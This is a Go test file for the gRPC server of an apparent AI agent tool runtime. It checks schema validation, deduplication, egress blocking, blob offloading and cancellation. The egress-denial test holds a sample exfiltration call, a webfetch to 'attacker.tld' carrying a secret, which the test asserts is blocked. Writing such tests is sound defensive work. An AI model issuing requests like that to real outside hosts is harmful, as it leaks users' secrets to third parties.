// Package grpc tests — tool-runtime inbound gRPC server tests using bufconn.
//
// The real execute.Service (wired to the truntimetest fakes + in-memory blob
// fake) sits behind the generated ToolRuntimeServiceServer, exercised over an
// in-memory bufconn connection. No Docker, no Postgres, no network. The tests
// assert (the T-TR-08 "tests first" battery):
//
//   - ExecuteTool validates+dispatches and streams a terminal result;
//   - a schema violation surfaces as result.is_error=true, never a gRPC fault;
//   - a Mutating tool with a known-completed dedup key returns the prior result;
//   - an External tool denied by the egress broker is blocked (is_error=true);
//   - ListTools returns the merged native + MCP tool set;
//   - large output is offloaded to a blob (truncated=true + blob_ref);
//   - cancellation propagates to the workspace kill.
package grpc

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/test/bufconn"

	genproto "github.com/boltrope/boltrope/gen/boltrope/v1"
	"github.com/boltrope/boltrope/internal/platform/blob/blobtest"
	"github.com/boltrope/boltrope/internal/toolruntime/adapter/registry"
	"github.com/boltrope/boltrope/internal/toolruntime/app"
	"github.com/boltrope/boltrope/internal/toolruntime/app/execute"
	"github.com/boltrope/boltrope/internal/toolruntime/app/truntimetest"
	"github.com/boltrope/boltrope/internal/toolruntime/domain"
)

const bufSize = 1 << 20 // 1 MiB

var objSchema = json.RawMessage(`{
	"type": "object",
	"required": ["x"],
	"properties": {"x": {"type": "string"}},
	"additionalProperties": false
}`)

// testEnv bundles a running bufconn server, a client, and the injected fakes.
type testEnv struct {
	client  genproto.ToolRuntimeServiceClient
	reg     *registry.Registry
	egress  *truntimetest.FakeEgressBroker
	dedup   *truntimetest.FakeDedupStore
	runtime *truntimetest.FakeRuntimePort
}

// newTestEnv builds an execute.Service around fresh fakes, registers the inbound
// Server on a bufconn gRPC server, and returns a connected client.
func newTestEnv(t *testing.T) *testEnv {
	t.Helper()
	reg := registry.New(nil)
	egress := truntimetest.NewFakeEgressBroker()
	dedup := truntimetest.NewFakeDedupStore()
	runtime := truntimetest.NewFakeRuntimePort()
	svc, err := execute.NewService(execute.Config{
		Registry: reg,
		Runtime:  runtime,
		Egress:   egress,
		Dedup:    dedup,
		Blobs:    blobtest.NewFakeBlobStore(),
	})
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}

	lis := bufconn.Listen(bufSize)
	grpcSrv := grpc.NewServer()
	genproto.RegisterToolRuntimeServiceServer(grpcSrv, NewServer(svc, reg))
	go func() { _ = grpcSrv.Serve(lis) }()

	conn, err := grpc.NewClient(
		"passthrough://bufnet",
		grpc.WithContextDialer(func(context.Context, string) (net.Conn, error) { return lis.Dial() }),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() {
		_ = conn.Close()
		grpcSrv.Stop()
	})
	return &testEnv{
		client:  genproto.NewToolRuntimeServiceClient(conn),
		reg:     reg,
		egress:  egress,
		dedup:   dedup,
		runtime: runtime,
	}
}

func mustRegister(t *testing.T, reg *registry.Registry, tool domain.Tool) {
	t.Helper()
	if err := reg.Register(context.Background(), tool); err != nil {
		t.Fatalf("Register(%s): %v", tool.Spec().Name, err)
	}
}

// recvAll drains an ExecuteTool server stream into a slice of events.
func recvAll(t *testing.T, stream grpc.ServerStreamingClient[genproto.ExecuteToolEvent]) []*genproto.ExecuteToolEvent {
	t.Helper()
	var out []*genproto.ExecuteToolEvent
	for {
		ev, err := stream.Recv()
		if errors.Is(err, io.EOF) {
			return out
		}
		if err != nil {
			t.Fatalf("stream.Recv: %v", err)
		}
		out = append(out, ev)
	}
}

// terminalOf returns the single terminal result from a drained event slice,
// failing if there is not exactly one and it is last.
func terminalOf(t *testing.T, events []*genproto.ExecuteToolEvent) *genproto.TerminalToolResult {
	t.Helper()
	if len(events) == 0 {
		t.Fatalf("no events received")
	}
	var term *genproto.TerminalToolResult
	for i, ev := range events {
		if tr := ev.GetTerminalResult(); tr != nil {
			if i != len(events)-1 {
				t.Errorf("terminal result at index %d, want last (%d)", i, len(events)-1)
			}
			if term != nil {
				t.Errorf("more than one terminal result in stream")
			}
			term = tr
		}
	}
	if term == nil {
		t.Fatalf("no terminal result in stream of %d events", len(events))
	}
	return term
}

// TestExecuteTool_StreamsTerminalResult asserts a valid call dispatches and the
// stream ends with a terminal result carrying the tool's content and the call id.
func TestExecuteTool_StreamsTerminalResult(t *testing.T) {
	env := newTestEnv(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: "file contents"}, nil)
	mustRegister(t, env.reg, tool)

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "read", ArgsJson: `{"x":"hello"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	events := recvAll(t, stream)
	term := terminalOf(t, events)
	if term.GetResult().GetContent() != "file contents" {
		t.Errorf("content = %q, want %q", term.GetResult().GetContent(), "file contents")
	}
	if term.GetResult().GetIsError() {
		t.Errorf("is_error = true, want false")
	}
	if term.GetResult().GetCallId() != "call1" {
		t.Errorf("call_id = %q, want call1", term.GetResult().GetCallId())
	}
}

// TestExecuteTool_SchemaViolationIsErrorResult asserts a schema violation
// surfaces as result.is_error=true, NEVER a gRPC fault (FR-TOOL-01).
func TestExecuteTool_SchemaViolationIsErrorResult(t *testing.T) {
	env := newTestEnv(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})
	mustRegister(t, env.reg, tool)

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "read", ArgsJson: `{"wrong":"field"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool (open): %v", err)
	}
	events := recvAll(t, stream) // must NOT error at the RPC layer
	term := terminalOf(t, events)
	if !term.GetResult().GetIsError() {
		t.Errorf("is_error = false, want true for a schema violation")
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute called %d times on invalid input, want 0", len(tool.ExecCalls))
	}
}

// TestExecuteTool_MutatingDedupHitReturnsPrior asserts a Mutating tool with a
// known-completed dedup key returns the prior result without re-executing.
func TestExecuteTool_MutatingDedupHitReturnsPrior(t *testing.T) {
	env := newTestEnv(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "write",
		Description: "writes",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: "freshly executed"}, nil)
	mustRegister(t, env.reg, tool)

	if err := env.dedup.Complete(context.Background(), app.ExecutionRecord{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		IdempotencyKey: "key1",
		Status:         app.ExecCompleted,
		Result:         domain.Observation{Content: "prior result"},
	}); err != nil {
		t.Fatalf("seed dedup: %v", err)
	}

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "write", ArgsJson: `{"x":"data"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	term := terminalOf(t, recvAll(t, stream))
	if term.GetResult().GetContent() != "prior result" {
		t.Errorf("content = %q, want prior result (dedup hit)", term.GetResult().GetContent())
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute called %d times on dedup hit, want 0", len(tool.ExecCalls))
	}
}

// TestExecuteTool_ExternalDeniedByEgress asserts an External tool with no egress
// allowance is blocked (is_error=true) and never executes.
func TestExecuteTool_ExternalDeniedByEgress(t *testing.T) {
	env := newTestEnv(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "webfetch",
		Description: "fetches",
		JSONSchema: json.RawMessage(`{
			"type": "object",
			"required": ["url"],
			"properties": {"url": {"type": "string"}},
			"additionalProperties": false
		}`),
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassExternal,
	})
	tool.AddObservation(domain.Observation{Content: "should not run"}, nil)
	mustRegister(t, env.reg, tool)

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "webfetch", ArgsJson: `{"url":"https://attacker.tld/?secret=1"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	term := terminalOf(t, recvAll(t, stream))
	if !term.GetResult().GetIsError() {
		t.Errorf("is_error = false, want true (egress denied)")
	}
	if !strings.Contains(strings.ToLower(term.GetResult().GetContent()), "egress") {
		t.Errorf("content = %q, want it to mention egress", term.GetResult().GetContent())
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute called %d times despite egress denial, want 0", len(tool.ExecCalls))
	}
}

// TestExecuteTool_LargeOutputOffloaded asserts oversized output is offloaded:
// truncated=true and a populated blob_ref on the terminal result.
func TestExecuteTool_LargeOutputOffloaded(t *testing.T) {
	env := newTestEnv(t)
	big := strings.Repeat("A", execute.BlobThresholdBytes+512)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "bash",
		Description: "runs",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: big}, nil)
	mustRegister(t, env.reg, tool)

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "bash", ArgsJson: `{"x":"y"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	term := terminalOf(t, recvAll(t, stream))
	if !term.GetTruncated() {
		t.Errorf("truncated = false, want true")
	}
	if term.GetBlobRef() == nil || term.GetBlobRef().GetRef() == "" {
		t.Fatalf("blob_ref empty, want populated for offloaded output")
	}
	if term.GetBlobRef().GetSizeBytes() != int64(len(big)) {
		t.Errorf("blob_ref size = %d, want %d", term.GetBlobRef().GetSizeBytes(), len(big))
	}
}

// TestExecuteTool_ProgressThenTerminal asserts the stream may carry progress
// events but always ends with exactly one terminal result.
func TestExecuteTool_ProgressThenTerminal(t *testing.T) {
	env := newTestEnv(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: "ok"}, nil)
	mustRegister(t, env.reg, tool)

	stream, err := env.client.ExecuteTool(context.Background(), &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "read", ArgsJson: `{"x":"hello"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	events := recvAll(t, stream)
	// At least the terminal; any earlier events must be progress.
	for i := 0; i < len(events)-1; i++ {
		if events[i].GetProgress() == nil {
			t.Errorf("event %d is not progress: %+v", i, events[i])
		}
	}
	_ = terminalOf(t, events)
}

// TestListTools_ReturnsMergedSet asserts ListTools returns the merged native +
// lazily-loaded MCP tool specs, each with name/description/schema and classes
// mapped to the wire enums (FR-EXT-01 AC-3).
func TestListTools_ReturnsMergedSet(t *testing.T) {
	// A registry with a native tool plus a lazy MCP source contributing one tool.
	mcp := &fakeMCPSource{tools: []domain.Tool{
		truntimetest.NewFakeTool(domain.ToolSpec{
			Name:        "mcp_search",
			Description: "mcp provided search",
			JSONSchema:  objSchema,
			SideEffect:  domain.SideEffectMutating,
			EgressClass: domain.EgressClassExternal,
		}),
	}}
	reg := registry.New(mcp)
	if err := reg.Register(context.Background(), truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads a file",
		JSONSchema:  objSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})); err != nil {
		t.Fatalf("Register: %v", err)
	}

	svc, err := execute.NewService(execute.Config{
		Registry: reg,
		Runtime:  truntimetest.NewFakeRuntimePort(),
		Egress:   truntimetest.NewFakeEgressBroker(),
		Dedup:    truntimetest.NewFakeDedupStore(),
		Blobs:    blobtest.NewFakeBlobStore(),
	})
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	lis := bufconn.Listen(bufSize)
	grpcSrv := grpc.NewServer()
	genproto.RegisterToolRuntimeServiceServer(grpcSrv, NewServer(svc, reg))
	go func() { _ = grpcSrv.Serve(lis) }()
	conn, err := grpc.NewClient(
		"passthrough://bufnet",
		grpc.WithContextDialer(func(context.Context, string) (net.Conn, error) { return lis.Dial() }),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() { _ = conn.Close(); grpcSrv.Stop() })
	client := genproto.NewToolRuntimeServiceClient(conn)

	resp, err := client.ListTools(context.Background(), &genproto.ListToolsRequest{
		TenantId:  "tenantA",
		SessionId: "sess1",
	})
	if err != nil {
		t.Fatalf("ListTools: %v", err)
	}
	byName := map[string]*genproto.ToolSpec{}
	for _, spec := range resp.GetTools() {
		if spec.GetName() == "" || spec.GetDescription() == "" || spec.GetJsonSchema() == "" {
			t.Errorf("tool %q has an empty name/description/schema: %+v", spec.GetName(), spec)
		}
		byName[spec.GetName()] = spec
	}
	if len(byName) != 2 {
		t.Fatalf("got %d tools, want 2 (native+mcp): %v", len(byName), keys(byName))
	}
	if _, ok := byName["read"]; !ok {
		t.Errorf("missing native tool 'read'")
	}
	mcpSpec, ok := byName["mcp_search"]
	if !ok {
		t.Fatalf("missing MCP tool 'mcp_search'")
	}
	if mcpSpec.GetSideEffect() != genproto.SideEffect_SIDE_EFFECT_MUTATING {
		t.Errorf("mcp_search side_effect = %v, want MUTATING", mcpSpec.GetSideEffect())
	}
	if mcpSpec.GetEgressClass() != genproto.EgressClass_EGRESS_CLASS_EXTERNAL {
		t.Errorf("mcp_search egress_class = %v, want EXTERNAL", mcpSpec.GetEgressClass())
	}
	// The native read tool maps to ReadOnly / None.
	if byName["read"].GetSideEffect() != genproto.SideEffect_SIDE_EFFECT_READ_ONLY {
		t.Errorf("read side_effect = %v, want READ_ONLY", byName["read"].GetSideEffect())
	}
	if byName["read"].GetEgressClass() != genproto.EgressClass_EGRESS_CLASS_NONE {
		t.Errorf("read egress_class = %v, want NONE", byName["read"].GetEgressClass())
	}
}

// TestExecuteTool_CancellationPropagates asserts that cancelling the client
// context causes the in-sandbox Exec to observe cancellation (the workspace-kill
// seam): a tool that blocks on its ctx returns once the client cancels.
func TestExecuteTool_CancellationPropagates(t *testing.T) {
	env := newTestEnv(t)
	// A tool whose Execute blocks until its ctx is done, then reports Killed.
	tool := &blockingTool{
		spec: domain.ToolSpec{
			Name:        "bash",
			Description: "long running",
			JSONSchema:  objSchema,
			SideEffect:  domain.SideEffectMutating,
			EgressClass: domain.EgressClassNone,
		},
		started: make(chan struct{}),
	}
	mustRegister(t, env.reg, tool)

	ctx, cancel := context.WithCancel(context.Background())
	stream, err := env.client.ExecuteTool(ctx, &genproto.ExecuteToolRequest{
		TenantId:       "tenantA",
		SessionId:      "sess1",
		Call:           &genproto.ToolCall{Id: "call1", Name: "bash", ArgsJson: `{"x":"y"}`},
		IdempotencyKey: "key1",
	})
	if err != nil {
		t.Fatalf("ExecuteTool: %v", err)
	}
	// Wait until the tool is executing, then cancel the client stream.
	select {
	case <-tool.started:
	case <-time.After(2 * time.Second):
		t.Fatal("tool did not start in time")
	}
	cancel()

	// Drain the stream until it terminates (RPC cancellation, or a terminal the
	// server managed to send before the transport tore down). Recv must stop
	// blocking promptly.
	done := make(chan struct{})
	go func() {
		for {
			if _, rerr := stream.Recv(); rerr != nil {
				break
			}
		}
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(3 * time.Second):
		t.Fatal("stream did not terminate after client cancel — cancellation did not propagate")
	}

	// The server handler's context is cancelled by the client cancel; the tool's
	// Execute, sharing that context, unblocks and records it. Poll for it (the
	// handler goroutine may observe ctx.Done slightly after the transport-level
	// Recv error that closed `done`).
	deadline := time.Now().Add(3 * time.Second)
	for !tool.ctxCancelled() && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if !tool.ctxCancelled() {
		t.Error("tool did not observe ctx cancellation; cancellation did not reach the workspace")
	}
}

// ---------------------------------------------------------------------------
// test doubles
// ---------------------------------------------------------------------------

// fakeMCPSource is a lazy registry.MCPSource returning a fixed tool set.
type fakeMCPSource struct{ tools []domain.Tool }

func (s *fakeMCPSource) Tools(context.Context) ([]domain.Tool, error) { return s.tools, nil }

// blockingTool blocks in Execute until its ctx is cancelled.
type blockingTool struct {
	spec      domain.ToolSpec
	started   chan struct{}
	once      sync.Once
	mu        sync.Mutex
	cancelled bool
}

func (b *blockingTool) Spec() domain.ToolSpec { return b.spec }

func (b *blockingTool) Execute(ctx context.Context, _ string, _ map[string]any) (domain.Observation, error) {
	b.once.Do(func() { close(b.started) })
	<-ctx.Done()
	b.mu.Lock()
	b.cancelled = true
	b.mu.Unlock()
	// Mirror the workspace kill contract: report killed-on-cancel.
	return domain.Observation{Content: "killed", IsError: true}, nil
}

func (b *blockingTool) ctxCancelled() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.cancelled
}

func keys(m map[string]*genproto.ToolSpec) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
